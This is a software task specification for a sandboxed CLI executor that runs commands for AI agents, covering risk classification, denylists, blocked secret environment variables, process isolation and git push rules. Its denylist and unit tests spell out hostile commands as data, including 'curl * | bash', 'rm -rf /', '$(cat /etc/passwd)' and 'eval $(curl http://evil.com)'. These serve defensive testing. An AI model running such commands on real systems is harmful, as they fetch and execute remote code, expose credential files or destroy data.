# 058: CLI Sandbox and Execution

| Field | Value |
|-------|-------|
| Layer | L4 |
| Size | M (1–2 days) |
| Spec refs | doc 11 §CLISandboxing, doc 11 §ConstructedEnvironment, doc 11 §CompoundCommands, doc 11 §OutputCapture, doc 11 §GitOperationRules |
| Spec status | finished |
| Depends on | 052, 053, 055, 056, 004, 027 |
| Blocks | 078, 087 |

## Scope

Build the CLI sandboxing and execution subsystem: `cli_execution` DDL, the constructed
environment builder, risk classification, compound command decomposition, working directory
enforcement, process isolation, stdout/stderr capture, `run_artifact` creation for large
outputs, and git operation rule enforcement. `CLIExecutor` is called from the `cli.execute`
tool handler (task 057) and from the turn engine (task 048) for CLI dispatches.

### Must build

**Migration:**
- `0065_cli_execution.sql`

**`cli_execution` table** (doc 11):
- `id uuid primary key default gen_random_uuid()`
- `run_id uuid not null references run(id) on delete cascade`
- `run_step_id uuid not null references run_step(id) on delete cascade` — NOT NULL; broker always creates RunStep before CLI dispatch (see ISSUE #19)
- `task_id uuid not null references project_task(id) on delete cascade`
- `project_id uuid not null references project(id) on delete cascade`
- `agent_id uuid not null references agent(id) on delete cascade`
- `command text not null` — the full command string as submitted
- `working_directory text not null` — resolved absolute path (within workspace)
- `risk_level text not null check (risk_level in ('low','medium','high','critical'))` — computed from command classification
- `policy_decision text not null check (policy_decision in ('allowed','denied'))` — result of risk check against org policy
- `exit_code integer` — null until process exits
- `stdout_artifact_id uuid references run_artifact(id) on delete set null` — null if stdout ≤50KB (stored inline in run_event)
- `stderr_artifact_id uuid references run_artifact(id) on delete set null`
- `env_vars_used jsonb not null default '{}'` — keys only, never values (for audit)
- `started_at timestamptz`
- `completed_at timestamptz`
- `duration_ms integer`
- `metadata jsonb not null default '{}'`
- `created_at timestamptz not null default now()`
- Index: `(run_id)`, `(task_id, created_at)`, `(risk_level)`

**`CLIExecutionRepository`** — Create, Get, UpdateCompletion, ListByRun, ListByTask

**`CLIExecutor`** (in `internal/cli/executor.go`):

**`CLIExecutor.Execute(ctx, CLIExecuteInput) (CLIExecuteOutput, error)`:**
- Input: `{run_id, run_step_id, task_id, project_id, agent_id, command, working_directory?, timeout_seconds?, env_overrides?}`
- Returns: `{exit_code, stdout_truncated, stderr_truncated, stdout_inline?, stderr_inline?, stdout_artifact_id?, stderr_artifact_id?, duration_ms}`

**Risk classification** (`RiskClassifier.Classify(command string) RiskLevel`):
- Parses the command string and classifies risk:
  - `low`: read-only commands (git status, git log, cat, ls, grep, find, head, tail, echo, pwd, which, type, env, printenv, wc, diff, stat)
  - `medium`: write operations that do not affect production systems (git add, git commit, npm install, go build, make, cp, mv, mkdir, touch, chmod, chown within workspace)
  - `high`: operations that modify remotes or system state (git push, git fetch, git pull, curl with -X POST/PUT/PATCH/DELETE, wget, ssh, scp, rsync)
  - `critical`: destructive commands (rm -rf, DROP TABLE, truncate, format, dd, mkfs) or commands with shell injection risk (any use of `$(...)`, backtick substitution in untrusted context)
- Compound command decomposition: parse `&&`, `||`, `;`, `|` separators; classify each sub-command independently; final risk = max of all parts.
- Shell metacharacter injection prevention: strip or reject `>`, `>>`, `<` redirects (stdin/stdout redirection is not supported; use `--output` flag patterns instead). File descriptor operations blocked.

**Denylist enforcement:**
- Maintain a hardcoded denylist of patterns (configurable via org policy):
  ```
  rm -rf /
  sudo
  su
  passwd
  chmod 777
  curl * | bash
  wget * | sh
  eval
  exec
  ```
- Pattern matching: substring match after shell parsing; reject if any sub-command matches a denylist pattern.
- Return `{error: "command_denied", pattern: <matched_pattern>}` without executing.

**Constructed environment:**
Always-present environment variables set for every CLI execution:
```
OTTERCAMP_TASK_ID=<task_id>
OTTERCAMP_PROJECT_ID=<project_id>
OTTERCAMP_AGENT_ID=<agent_id>
OTTERCAMP_ORG_ID=<org_id>
OTTERCAMP_RUN_ID=<run_id>
HOME=/tmp/ottercamp-<run_id>  (isolated per-run home directory)
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin  (explicit safe PATH)
```

Blocked environment variables (never injected, removed if present in inherited env):
- `OPENAI_API_KEY`
- `ANTHROPIC_API_KEY`
- `OTTERCAMP_MASTER_KEY`
- `OTTERCAMP_DB_URL`
- Any key matching `*_SECRET` or `*_PASSWORD` pattern (unless explicitly added via project config)

Project-injected environment variables:
- Sourced from `project.settings.env_vars` (jsonb field — design choice: add `env_vars jsonb default '{}'` to `project` table; task 016 implementer notes reference this thin spec area from doc 11).
- All string values; resolved at execution time.
- Org secret values resolved via `SecretService.Resolve(ref:<slug>)` at execution time (never cached).

Agent-provided overrides (`env_overrides` input parameter):
- Only keys NOT in the blocked list are accepted; blocked keys are silently dropped.

**Working directory enforcement:**
- If `working_directory` is provided: resolve via `SessionWorkDir.ResolvePath` (from task 056). Reject if path traversal detected.
- If not provided: use the task's workspace root (`<data_dir>/workspaces/<org_id>/<project_id>/<task_id>/`).
- The resolved `working_directory` is stored on the `cli_execution` row.
- The `exec.Command` is started with `cmd.Dir = resolvedWorkingDirectory`.

**Process isolation:**
- Each CLI command runs in a new `exec.CommandContext` goroutine.
- `cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}` — creates a new process group for clean signal delivery.
- On context cancellation or timeout: `syscall.Kill(-cmd.Process.Pid, syscall.SIGTERM)` → wait 5 seconds → `SIGKILL` if still running.
- No root escalation; CLI runs as the same OS user as the OtterCamp process.

**Timeout enforcement:**
- `timeout_seconds` input parameter (default 300 seconds / 5 minutes; max 3600 / 1 hour).
- Implemented via `context.WithTimeout(ctx, timeout)` passed to `exec.CommandContext`.
- On timeout: kill process group (see above), record `cli_execution.exit_code = -1`, emit `run_event(event_type='output_chunk', payload={type:'timeout'})`.

**Stdout/stderr capture and output handling:**
- Pipe both stdout and stderr during execution.
- Tee stdout/stderr to in-memory buffers and to a streaming emitter simultaneously.
- Emit `run_event(event_type='output_chunk', payload={stream:'stdout'|'stderr', delta: <chunk>})` every time a chunk (up to 4KB) is read.
- 50KB inline limit: if total stdout ≤ 51200 bytes, store inline in `cli_execution` metadata (not a `run_artifact`).
- If total stdout > 51200 bytes OR > 10MB total: write to object storage via task 004; create `run_artifact(artifact_type='stdout', storage_key=..., byte_size=..., inline_content=null)`.
- Hard 10MB total cap: if the combined stdout+stderr exceeds 10MB, kill the process and record `{error: "output_size_exceeded"}` in the `cli_execution` metadata.
- `cli_execution.stdout_artifact_id` is set only for large outputs (>50KB).

**Git operation rules** (doc 11, enforced in the command classifier before execution):
- Before any `git push` command: parse the target branch. If branch is `main`, `master`, or matches `refs/heads/main|master`: return `{error: "git_push_to_main_denied"}`.
- Before any `git push --force`: same check; ALSO check if the branch matches `shared/*` pattern → deny.
- These checks are performed by `RiskClassifier` during the `critical` risk classification, not at runtime.

**`cli_execution` lifecycle:**
1. `CLIExecutor.Execute` is called by the `cli.execute` tool handler (task 057).
2. Insert `cli_execution` row with `policy_decision='allowed'` (capability check already done by broker).
3. Build constructed environment.
4. Classify risk; if denied: update row with `policy_decision='denied'`; return error.
5. Start process with timeout.
6. Capture output, emit `run_event` chunks.
7. On completion: update `cli_execution` with `exit_code`, `completed_at`, `duration_ms`, artifact IDs.
8. Return `CLIExecuteOutput`.

### Must NOT build

- `cli.execute` tool handler (task 057) — this is the executor called by that handler
- Policy capability check (task 055 broker)
- Browser execution (task 059)
- Working directory creation logic (task 056 — `SessionWorkDir` is defined there)

## Acceptance Criteria

- [ ] `RiskClassifier.Classify("git push origin main")` returns `critical`
- [ ] `RiskClassifier.Classify("git status && git log --oneline -5")` returns `low`
- [ ] `RiskClassifier.Classify("npm install && git push --force origin shared/dev")` returns `critical` (max of parts)
- [ ] Denylist match: command containing `sudo` returns `{error: "command_denied"}` without executing
- [ ] `OPENAI_API_KEY` is never present in the constructed environment; silently dropped even if in `env_overrides`
- [ ] Working directory outside workspace root: `CLIExecutor.Execute` with path `../../etc` returns `ErrPathTraversal` before process start
- [ ] Stdout capture: command that outputs 100KB → `run_artifact` created, `cli_execution.stdout_artifact_id` populated, `inline_content=null`
- [ ] Stdout capture: command that outputs 10KB → no `run_artifact`, output stored inline in `cli_execution` metadata
- [ ] Process timeout: command that sleeps 600s with `timeout_seconds=5` → killed within 10s, `exit_code=-1`

## Tests Required

**Unit tests:**
- `RiskClassifier` matrix: test each risk level with representative commands
- Compound command decomposition: `"git status && curl -X DELETE https://example.com/api"` → risk=`high`
- Shell injection: command containing `$(cat /etc/passwd)` → risk=`critical`
- Blocked env vars: `env_overrides={ANTHROPIC_API_KEY: "sk-..."}` → key silently dropped from constructed env
- Denylist: `"eval $(curl http://evil.com)"` → denied
- Git push to main: `"git push origin main"` → classified as `critical`, policy_decision='denied'
- Git force push to shared: `"git push --force origin shared/dev"` → denied

**Integration tests:**
- Full execute round-trip: run `echo "hello"` in a temp workspace; verify `cli_execution` row created, `exit_code=0`, stdout inline content = `"hello\n"`
- Large output: command that outputs 100KB → `run_artifact` row created in DB, `stdout_artifact_id` set on `cli_execution`
- Timeout: `sleep 60` with `timeout_seconds=2` → process killed, `duration_ms ≤ 8000`, `exit_code=-1`
- `run_event` chunks: command outputs 3 lines → at least 1 `output_chunk` run_event emitted per line (or per chunk)
- Constructed env: `echo $OTTERCAMP_TASK_ID` outputs the correct task ID; `echo $OPENAI_API_KEY` outputs empty string

**E2E tests:**
- None — covered by dedicated E2E task 078

## Implementer Notes

**ISSUE #19 (RESOLVED):**
`run_step_id NOT NULL` is intentional. The broker always creates a `run_step` before
dispatching any CLI command. `CLIExecutor` receives `run_step_id` as a required input.
This is the correct design — all domain-specific execution records (cli_execution,
browser_action) are always tied to a RunStep.

**Project env_vars thin spec:**
Doc 11 references "project-config injected vars" but does not define the source. This task
adds `env_vars jsonb not null default '{}'` to the `project` table via a new migration
(`0065b_project_env_vars.sql`). The field stores a flat `{KEY: VALUE}` map. If `project` table
already has this column (unlikely given task 016 predates this decision), skip the migration.

**Process group kill:**
Using `cmd.SysProcAttr.Setsid = true` creates a new session (and process group) for the
child. Kill with `syscall.Kill(-pid, syscall.SIGTERM)` (negative PID = kill process group).
The 5-second grace window before SIGKILL applies to all processes in the group, ensuring
children spawned by shell scripts are also terminated.
